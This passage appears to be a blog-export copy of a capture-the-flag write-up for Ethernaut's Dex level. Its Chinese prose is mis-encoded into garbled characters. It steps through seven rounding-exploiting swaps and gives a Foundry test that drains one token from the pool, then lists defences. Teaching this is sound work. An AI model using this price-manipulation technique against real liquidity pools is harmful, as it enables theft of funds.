Solidityï¼ˆä»¥åŠè®¸å¤šå…¶ä»–ç¼–ç¨‹è¯­è¨€ï¼‰ä¸­æ•´æ•°é™¤æ³•å‘ä¸‹èˆå…¥çš„ç‰¹æ€§ï¼Œæ˜¯è®¸å¤šæ•°å­¦ç›¸å…³æ¼æ´çš„æ ¹æºã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åœ¨æ™ºèƒ½åˆçº¦ä¸­è¿›è¡Œé‡‘èè®¡ç®—æ—¶ï¼Œæ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®å¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ¼æ´ã€‚\n-   ç®€å•çš„ã€åŸºäºå³æ—¶æµåŠ¨æ€§çš„ä»·æ ¼å‘ç°æœºåˆ¶å¾ˆå®¹æ˜“è¢«æ“çºµã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡ä¸€ç³»åˆ—ç²¾å¿ƒè®¾è®¡çš„äº¤æ˜“ï¼Œåˆ©ç”¨å¹¶æ”¾å¤§æ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®ã€‚\n-   é€æ¸ç§¯ç´¯ä¼˜åŠ¿ï¼Œç›´åˆ°èƒ½å¤Ÿå®Œå…¨è€—å°½æµåŠ¨æ€§æ± ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä½¿ç”¨æ›´æˆç†Ÿå’ŒæŠ—æ“çºµçš„å®šä»·æ¨¡å‹ï¼ˆå¦‚æ’å®šä¹˜ç§¯æ¨¡å‹ï¼‰ã€‚\n-   åœ¨è¿›è¡Œæ•°å­¦è¿ç®—æ—¶ï¼Œå§‹ç»ˆæ³¨æ„è¿ç®—é¡ºåºå’Œç²¾åº¦æŸå¤±é—®é¢˜ã€‚\n-   å¯¹äºå…³é”®åº”ç”¨ï¼Œä¾èµ–äºå¥å£®çš„ä»·æ ¼é¢„è¨€æœºï¼Œè€Œä¸æ˜¯æ˜“å—æ”»å‡»çš„å³æ—¶ä»·æ ¼ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Uniswap V2 Whitepaper](https://uniswap.org/whitepaper.pdf)\n-   [Chainlink Price Feeds](https://docs.chain.link/docs/get-the-latest-price/)","source":"_posts/ethernaut-level-22-dex.md","raw":"---\ntitle: 'Ethernaut Level 22: Dex - ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´'\ndate: 2025-01-25 16:55:00\nupdated: 2025-01-25 16:55:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - é«˜çº§æ”»å‡»ç¯‡ (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - DEX\n  - Price Manipulation\n  - Integer Division\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\nseries: Ethernaut Foundry Solutions\nexcerpt: \"åˆ©ç”¨ä¸€ä¸ªç®€æ˜“DEXä¸­ç”±äºæ•´æ•°é™¤æ³•èˆå…¥è¯¯å·®å¯¼è‡´çš„ä»·æ ¼è®¡ç®—æ¼æ´ï¼Œé€šè¿‡å¤šæ¬¡å°é¢äº¤æ˜“æ¥è€—å°½æ± ä¸­å…¶ä¸­ä¸€ç§ä»£å¸çš„æµåŠ¨æ€§ã€‚å­¦ä¹ å¦‚ä½•é€šè¿‡åå¤äº¤æ¢æ¥æ”¾å¤§èˆå…¥è¯¯å·®ï¼Œæœ€ç»ˆå®ç°å¯¹ä»·æ ¼çš„å®Œå…¨æ“çºµã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 22: Dex - ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 22 - Dex](https://ethernaut.openzeppelin.com/level/22)  \n> **æ”»å‡»ç±»å‹**: ä»·æ ¼æ“çºµ / æ•´æ•°èˆå…¥æ¼æ´  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä½ å’Œ `Dex` åˆçº¦æœ€åˆéƒ½æ‹¥æœ‰ `Token1` å’Œ `Token2`ã€‚ä½ çš„ç›®æ ‡æ˜¯è€—å°½ `Dex` åˆçº¦ä¸­ `Token1` æˆ– `Token2` çš„å…¨éƒ¨æµåŠ¨æ€§ã€‚\n\n-   **åˆå§‹çŠ¶æ€**: \n    -   Player: 10 TKN1, 10 TKN2\n    -   Dex: 100 TKN1, 100 TKN2\n\n![Dex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¿™ä¸ª `Dex` åˆçº¦æ˜¯ä¸€ä¸ªæç®€çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼Œå…¶æ ¸å¿ƒæ¼æ´åœ¨äºå®ƒçš„ä»·æ ¼è®¡ç®—å‡½æ•° `getSwapPrice()`ï¼š\n\n```solidity\nfunction getSwapPrice(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));\n}\n```\n\nè¿™ä¸ªå‡½æ•°é€šè¿‡ä¸¤ç§ä»£å¸åœ¨æ± ä¸­ä½™é¢çš„æ¯”ä¾‹æ¥è®¡ç®—äº¤æ¢ä»·æ ¼ã€‚é—®é¢˜å‡ºåœ¨ Solidity çš„æ•´æ•°é™¤æ³•ä¸Šã€‚æ•´æ•°é™¤æ³•ä¼šå‘ä¸‹èˆå…¥åˆ°æœ€æ¥è¿‘çš„æ•´æ•°ï¼Œä»»ä½•å°æ•°éƒ¨åˆ†éƒ½ä¼šè¢«ä¸¢å¼ƒã€‚ä¾‹å¦‚ï¼Œ`7 / 2` çš„ç»“æœæ˜¯ `3`ï¼Œè€Œä¸æ˜¯ `3.5`ã€‚\n\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªèˆå…¥è¯¯å·®æ¥è·åˆ©ã€‚é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„äº¤æ¢é¡ºåºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¯æ¬¡äº¤æ¢ä¸­è·å¾—æ¯”é¢„æœŸâ€œå…¬å¹³â€ä»·æ ¼æ›´å¤šçš„ä»£å¸ï¼Œä»è€Œé€æ¸è€—å°½æ± ä¸­çš„èµ„é‡‘ã€‚\n\n### æ”»å‡»æµç¨‹\n\næˆ‘ä»¬çš„ç­–ç•¥æ˜¯é€šè¿‡åœ¨ä¸¤ç§ä»£å¸ä¹‹é—´åå¤äº¤æ¢æˆ‘ä»¬çš„å…¨éƒ¨ä½™é¢æ¥æ”¾å¤§è¿™ä¸ªèˆå…¥è¯¯å·®ã€‚\n\n1.  **åˆå§‹çŠ¶æ€**: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). ä»·æ ¼æ¯”ä¸º 1:1ã€‚\n\n2.  **ç¬¬ä¸€æ¬¡äº¤æ¢ (10 TKN1 -> TKN2)**:\n    -   `amountOut = (10 * 100) / 100 = 10`\n    -   Player: (0 TKN1, 20 TKN2)\n    -   Dex: (110 TKN1, 90 TKN2)\n\n3.  **ç¬¬äºŒæ¬¡äº¤æ¢ (20 TKN2 -> TKN1)**:\n    -   `amountOut = (20 * 110) / 90 = 24.44...` -> **èˆå…¥åä¸º 24**\n    -   Player: (24 TKN1, 0 TKN2)\n    -   Dex: (86 TKN1, 110 TKN2)\n\n4.  **ç¬¬ä¸‰æ¬¡äº¤æ¢ (24 TKN1 -> TKN2)**:\n    -   `amountOut = (24 * 110) / 86 = 30.69...` -> **èˆå…¥åä¸º 30**\n    -   Player: (0 TKN1, 30 TKN2)\n    -   Dex: (110 TKN1, 80 TKN2)\n\n5.  **ç¬¬å››æ¬¡äº¤æ¢ (30 TKN2 -> TKN1)**:\n    -   `amountOut = (30 * 110) / 80 = 41.25` -> **èˆå…¥åä¸º 41**\n    -   Player: (41 TKN1, 0 TKN2)\n    -   Dex: (69 TKN1, 110 TKN2)\n\n6.  **ç¬¬äº”æ¬¡äº¤æ¢ (41 TKN1 -> TKN2)**:\n    -   `amountOut = (41 * 110) / 69 = 65.36...` -> **èˆå…¥åä¸º 65**\n    -   Player: (0 TKN1, 65 TKN2)\n    -   Dex: (110 TKN1, 45 TKN2)\n\nç°åœ¨ï¼Œæˆ‘ä»¬æ‰‹ä¸Šæœ‰65ä¸ªTKN2ï¼Œè€ŒDexæ± ä¸­åªå‰©ä¸‹110ä¸ªTKN1å’Œ45ä¸ªTKN2ã€‚æˆ‘ä»¬åªéœ€è¦ç”¨45ä¸ªTKN2å°±å¯ä»¥æ¢èµ°æ± é‡Œæ‰€æœ‰çš„110ä¸ªTKN1ã€‚\n\n7.  **æœ€ç»ˆäº¤æ¢ (45 TKN2 -> TKN1)**:\n    -   `amountOut = (45 * 110) / 45 = 110`\n    -   Player: (110 TKN1, 20 TKN2)\n    -   Dex: (0 TKN1, 90 TKN2) -> **TKN1 è¢«è€—å°½ï¼**\n\né€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†æ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®ï¼Œåœ¨æ¯æ¬¡äº¤æ˜“ä¸­éƒ½è·å¾—äº†å¾®å°çš„ä¼˜åŠ¿ï¼Œå¹¶æœ€ç»ˆå°†è¿™ç§ä¼˜åŠ¿ç´¯ç§¯åˆ°è¶³ä»¥æ¸…ç©ºæ•´ä¸ªæ± å­ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### Foundry æµ‹è¯•ä»£ç \n\næµ‹è¯•ä»£ç å°†æ¨¡æ‹Ÿä¸Šè¿°çš„äº¤æ¢æµç¨‹ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/22_Dex.sol\";\n\ncontract DexTest is Test {\n    Dex instance;\n    address player;\n    SwappableToken token1;\n    SwappableToken token2;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new Dex();\n\n        // éƒ¨ç½²å¹¶è®¾ç½®ä»£å¸\n        token1 = new SwappableToken(address(instance), \"Token 1\", \"TKN1\", 110);\n        token2 = new SwappableToken(address(instance), \"Token 2\", \"TKN2\", 110);\n        instance.setTokens(address(token1), address(token2));\n\n        // æ·»åŠ æµåŠ¨æ€§\n        token1.approve(address(instance), 100);\n        token2.approve(address(instance), 100);\n        instance.addLiquidity(address(token1), 100);\n        instance.addLiquidity(address(token2), 100);\n\n        // å‘é€åˆå§‹ä»£å¸ç»™ player\n        token1.transfer(player, 10);\n        token2.transfer(player, 10);\n    }\n\n    function testDexAttack() public {\n        vm.startPrank(player);\n\n        // æˆæƒ Dex åˆçº¦æ— é™é‡çš„ä»£å¸\n        token1.approve(address(instance), type(uint256).max);\n        token2.approve(address(instance), type(uint256).max);\n\n        // æ‰§è¡Œæ”»å‡»æµç¨‹\n        swapAll(address(token1), address(token2)); // 10 TKN1 -> 10 TKN2\n        swapAll(address(token2), address(token1)); // 20 TKN2 -> 24 TKN1\n        swapAll(address(token1), address(token2)); // 24 TKN1 -> 30 TKN2\n        swapAll(address(token2), address(token1)); // 30 TKN2 -> 41 TKN1\n        swapAll(address(token1), address(token2)); // 41 TKN1 -> 65 TKN2\n        \n        // æœ€ç»ˆä¸€å‡»\n        instance.swap(address(token2), address(token1), 45);\n\n        // éªŒè¯ Dex ä¸­è‡³å°‘ä¸€ç§ä»£å¸å·²è¢«è€—å°½\n        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;\n        assertTrue(drained, \"Dex should be drained of one token\");\n\n        vm.stopPrank();\n    }\n\n    // è¾…åŠ©å‡½æ•°ï¼Œç”¨äºäº¤æ¢æŒ‡å®šä»£å¸çš„å…¨éƒ¨ä½™é¢\n    function swapAll(address tokenIn, address tokenOut) internal {\n        uint256 balance = IERC20(tokenIn).balanceOf(player);\n        instance.swap(tokenIn, tokenOut, balance);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **æˆæƒ**: æˆæƒ `Dex` åˆçº¦å¯ä»¥ä»ä½ çš„åœ°å€è½¬ç§» `Token1` å’Œ `Token2`ã€‚\n2.  **åå¤äº¤æ¢**: åœ¨ `Token1` å’Œ `Token2` ä¹‹é—´æ¥å›äº¤æ¢ä½ çš„å…¨éƒ¨ä½™é¢ã€‚\n3.  **åˆ©ç”¨è¯¯å·®**: æ¯æ¬¡äº¤æ¢éƒ½ä¼šå› ä¸ºæ•´æ•°é™¤æ³•çš„èˆå…¥è€Œäº§ç”Ÿå¾®å°çš„åˆ©æ¶¦ã€‚\n4.  **ç´¯ç§¯ä¼˜åŠ¿**: é‡å¤äº¤æ¢ï¼Œç›´åˆ°ä½ æ‹¥æœ‰çš„ä»£å¸æ•°é‡è¶³ä»¥ä¸€æ¬¡æ€§æ¢èµ°æ± ä¸­å‰©ä½™çš„æ‰€æœ‰å¦ä¸€ç§ä»£å¸ã€‚\n5.  **æœ€ç»ˆä¸€å‡»**: æ‰§è¡Œæœ€åä¸€æ¬¡äº¤æ¢ï¼Œæ¸…ç©ºæ± å­ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **é¿å…ä»·æ ¼æ“çºµ**: ç®€å•çš„ `balanceOf(A) / balanceOf(B)` ä»·æ ¼å…¬å¼ææ˜“å—åˆ°æ“çºµã€‚ç°ä»£DEXï¼ˆå¦‚Uniswap V2ï¼‰ä½¿ç”¨ `x * y = k` çš„æ’å®šä¹˜ç§¯å…¬å¼ï¼Œè¿™ä½¿å¾—æ“çºµä»·æ ¼çš„æˆæœ¬è¦é«˜å¾—å¤šã€‚\n2.  **å¤„ç†èˆå…¥è¯¯å·®**: åœ¨é‡‘èè®¡ç®—ä¸­ï¼Œå¿…é¡»ä»”ç»†å¤„ç†ç²¾åº¦é—®é¢˜ã€‚å¯ä»¥è€ƒè™‘ï¼š\n    *   å°†è®¡ç®—é¡ºåºè°ƒæ•´ä¸ºå…ˆä¹˜åé™¤ï¼Œä»¥å‡å°‘ç²¾åº¦æŸå¤±ã€‚\n    *   ä½¿ç”¨æ›´é«˜ç²¾åº¦çš„æ•°å­¦åº“ï¼Œå¦‚ `SafeMath` æˆ–ä¸“é—¨çš„å®šç‚¹æ•°åº“ã€‚\n3.  **ä½¿ç”¨å»ä¸­å¿ƒåŒ–é¢„è¨€æœº**: å¯¹äºéœ€è¦å¯é ä»·æ ¼çš„åº”ç”¨ï¼Œä¸åº”ä¾èµ–äºå•ä¸ªDEXæ± çš„ç¬æ—¶ä»·æ ¼ã€‚åº”ä½¿ç”¨æ›´ç¨³å¥çš„ä»·æ ¼æ¥æºï¼Œå¦‚ Chainlink æˆ– Uniswap V3 çš„æ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼ˆTWAPï¼‰é¢„è¨€æœºã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **DEX (å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€)**: ä¸€ç§åŸºäºæ™ºèƒ½åˆçº¦çš„äº¤æ˜“æ‰€ï¼Œå…è®¸ç”¨æˆ·åœ¨æ²¡æœ‰ä¸­å¿ƒåŒ–ä¸­ä»‹çš„æƒ…å†µä¸‹äº¤æ˜“åŠ å¯†èµ„äº§ã€‚\n-   **ä»·æ ¼é¢„è¨€æœº (Price Oracle)**: ä¸ºæ™ºèƒ½åˆçº¦æä¾›é“¾ä¸‹æˆ–é“¾ä¸Šèµ„äº§ä»·æ ¼ä¿¡æ¯çš„æœåŠ¡ã€‚\n-   **æ•´æ•°é™¤æ³•**: Solidityï¼ˆä»¥åŠè®¸å¤šå…¶ä»–ç¼–ç¨‹è¯­è¨€ï¼‰ä¸­æ•´æ•°é™¤æ³•å‘ä¸‹èˆå…¥çš„ç‰¹æ€§ï¼Œæ˜¯è®¸å¤šæ•°å­¦ç›¸å…³æ¼æ´çš„æ ¹æºã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åœ¨æ™ºèƒ½åˆçº¦ä¸­è¿›è¡Œé‡‘èè®¡ç®—æ—¶ï¼Œæ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®å¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ¼æ´ã€‚\n-   ç®€å•çš„ã€åŸºäºå³æ—¶æµåŠ¨æ€§çš„ä»·æ ¼å‘ç°æœºåˆ¶å¾ˆå®¹æ˜“è¢«æ“çºµã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡ä¸€ç³»åˆ—ç²¾å¿ƒè®¾è®¡çš„äº¤æ˜“ï¼Œåˆ©ç”¨å¹¶æ”¾å¤§æ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®ã€‚\n-   é€æ¸ç§¯ç´¯ä¼˜åŠ¿ï¼Œç›´åˆ°èƒ½å¤Ÿå®Œå…¨è€—å°½æµåŠ¨æ€§æ± ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä½¿ç”¨æ›´æˆç†Ÿå’ŒæŠ—æ“çºµçš„å®šä»·æ¨¡å‹ï¼ˆå¦‚æ’å®šä¹˜ç§¯æ¨¡å‹ï¼‰ã€‚\n-   åœ¨è¿›è¡Œæ•°å­¦è¿ç®—æ—¶ï¼Œå§‹ç»ˆæ³¨æ„è¿ç®—é¡ºåºå’Œç²¾åº¦æŸå¤±é—®é¢˜ã€‚\n-   å¯¹äºå…³é”®åº”ç”¨ï¼Œä¾èµ–äºå¥å£®çš„ä»·æ ¼é¢„è¨€æœºï¼Œè€Œä¸æ˜¯æ˜“å—æ”»å‡»çš„å³æ—¶ä»·æ ¼ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Uniswap V2 Whitepaper](https://uniswap.org/whitepaper.pdf)\n-   [Chainlink Price Feeds](https://docs.chain.link/docs/get-the-latest-price/)","slug":"ethernaut-level-22-dex","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpj001lbf5qagmd0xw7","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-22-Dex-ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-22-Dex-ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 22: Dex - ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´\"></a>ğŸ¯ Ethernaut Level 22: Dex - ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/22\">Ethernaut Level 22 - Dex</a><br><strong>æ”»å‡»ç±»å‹</strong>: ä»·æ ¼æ“çºµ &#x2F; æ•´æ•°èˆå…¥æ¼æ´<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä½ å’Œ <code>Dex</code> åˆçº¦æœ€åˆéƒ½æ‹¥æœ‰ <code>Token1</code> å’Œ <code>Token2</code>ã€‚ä½ çš„ç›®æ ‡æ˜¯è€—å°½ <code>Dex</code> åˆçº¦ä¸­ <code>Token1</code> æˆ– <code>Token2</code> çš„å…¨éƒ¨æµåŠ¨æ€§ã€‚</p>\n<ul>\n<li><strong>åˆå§‹çŠ¶æ€</strong>: <ul>\n<li>Player: 10 TKN1, 10 TKN2</li>\n<li>Dex: 100 TKN1, 100 TKN2</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg\" alt=\"Dex Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¿™ä¸ª <code>Dex</code> åˆçº¦æ˜¯ä¸€ä¸ªæç®€çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼Œå…¶æ ¸å¿ƒæ¼æ´åœ¨äºå®ƒçš„ä»·æ ¼è®¡ç®—å‡½æ•° <code>getSwapPrice()</code>ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class=\"line\">    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ªå‡½æ•°é€šè¿‡ä¸¤ç§ä»£å¸åœ¨æ± ä¸­ä½™é¢çš„æ¯”ä¾‹æ¥è®¡ç®—äº¤æ¢ä»·æ ¼ã€‚é—®é¢˜å‡ºåœ¨ Solidity çš„æ•´æ•°é™¤æ³•ä¸Šã€‚æ•´æ•°é™¤æ³•ä¼šå‘ä¸‹èˆå…¥åˆ°æœ€æ¥è¿‘çš„æ•´æ•°ï¼Œä»»ä½•å°æ•°éƒ¨åˆ†éƒ½ä¼šè¢«ä¸¢å¼ƒã€‚ä¾‹å¦‚ï¼Œ<code>7 / 2</code> çš„ç»“æœæ˜¯ <code>3</code>ï¼Œè€Œä¸æ˜¯ <code>3.5</code>ã€‚</p>\n<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªèˆå…¥è¯¯å·®æ¥è·åˆ©ã€‚é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„äº¤æ¢é¡ºåºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¯æ¬¡äº¤æ¢ä¸­è·å¾—æ¯”é¢„æœŸâ€œå…¬å¹³â€ä»·æ ¼æ›´å¤šçš„ä»£å¸ï¼Œä»è€Œé€æ¸è€—å°½æ± ä¸­çš„èµ„é‡‘ã€‚</p>\n<h3 id=\"æ”»å‡»æµç¨‹\"><a href=\"#æ”»å‡»æµç¨‹\" class=\"headerlink\" title=\"æ”»å‡»æµç¨‹\"></a>æ”»å‡»æµç¨‹</h3><p>æˆ‘ä»¬çš„ç­–ç•¥æ˜¯é€šè¿‡åœ¨ä¸¤ç§ä»£å¸ä¹‹é—´åå¤äº¤æ¢æˆ‘ä»¬çš„å…¨éƒ¨ä½™é¢æ¥æ”¾å¤§è¿™ä¸ªèˆå…¥è¯¯å·®ã€‚</p>\n<ol>\n<li><p><strong>åˆå§‹çŠ¶æ€</strong>: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). ä»·æ ¼æ¯”ä¸º 1:1ã€‚</p>\n</li>\n<li><p><strong>ç¬¬ä¸€æ¬¡äº¤æ¢ (10 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (10 * 100) / 100 = 10</code></li>\n<li>Player: (0 TKN1, 20 TKN2)</li>\n<li>Dex: (110 TKN1, 90 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬äºŒæ¬¡äº¤æ¢ (20 TKN2 -&gt; TKN1)</strong>:</p>\n<ul>\n<li><code>amountOut = (20 * 110) / 90 = 24.44...</code> -&gt; <strong>èˆå…¥åä¸º 24</strong></li>\n<li>Player: (24 TKN1, 0 TKN2)</li>\n<li>Dex: (86 TKN1, 110 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬ä¸‰æ¬¡äº¤æ¢ (24 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (24 * 110) / 86 = 30.69...</code> -&gt; <strong>èˆå…¥åä¸º 30</strong></li>\n<li>Player: (0 TKN1, 30 TKN2)</li>\n<li>Dex: (110 TKN1, 80 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬å››æ¬¡äº¤æ¢ (30 TKN2 -&gt; TKN1)</strong>:</p>\n<ul>\n<li><code>amountOut = (30 * 110) / 80 = 41.25</code> -&gt; <strong>èˆå…¥åä¸º 41</strong></li>\n<li>Player: (41 TKN1, 0 TKN2)</li>\n<li>Dex: (69 TKN1, 110 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬äº”æ¬¡äº¤æ¢ (41 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (41 * 110) / 69 = 65.36...</code> -&gt; <strong>èˆå…¥åä¸º 65</strong></li>\n<li>Player: (0 TKN1, 65 TKN2)</li>\n<li>Dex: (110 TKN1, 45 TKN2)</li>\n</ul>\n</li>\n</ol>\n<p>ç°åœ¨ï¼Œæˆ‘ä»¬æ‰‹ä¸Šæœ‰65ä¸ªTKN2ï¼Œè€ŒDexæ± ä¸­åªå‰©ä¸‹110ä¸ªTKN1å’Œ45ä¸ªTKN2ã€‚æˆ‘ä»¬åªéœ€è¦ç”¨45ä¸ªTKN2å°±å¯ä»¥æ¢èµ°æ± é‡Œæ‰€æœ‰çš„110ä¸ªTKN1ã€‚</p>\n<ol start=\"7\">\n<li><strong>æœ€ç»ˆäº¤æ¢ (45 TKN2 -&gt; TKN1)</strong>:<ul>\n<li><code>amountOut = (45 * 110) / 45 = 110</code></li>\n<li>Player: (110 TKN1, 20 TKN2)</li>\n<li>Dex: (0 TKN1, 90 TKN2) -&gt; <strong>TKN1 è¢«è€—å°½ï¼</strong></li>\n</ul>\n</li>\n</ol>\n<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†æ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®ï¼Œåœ¨æ¯æ¬¡äº¤æ˜“ä¸­éƒ½è·å¾—äº†å¾®å°çš„ä¼˜åŠ¿ï¼Œå¹¶æœ€ç»ˆå°†è¿™ç§ä¼˜åŠ¿ç´¯ç§¯åˆ°è¶³ä»¥æ¸…ç©ºæ•´ä¸ªæ± å­ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><p>æµ‹è¯•ä»£ç å°†æ¨¡æ‹Ÿä¸Šè¿°çš„äº¤æ¢æµç¨‹ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/22_Dex.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DexTest is Test &#123;</span><br><span class=\"line\">    Dex instance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    SwappableToken token1;</span><br><span class=\"line\">    SwappableToken token2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new Dex();</span><br><span 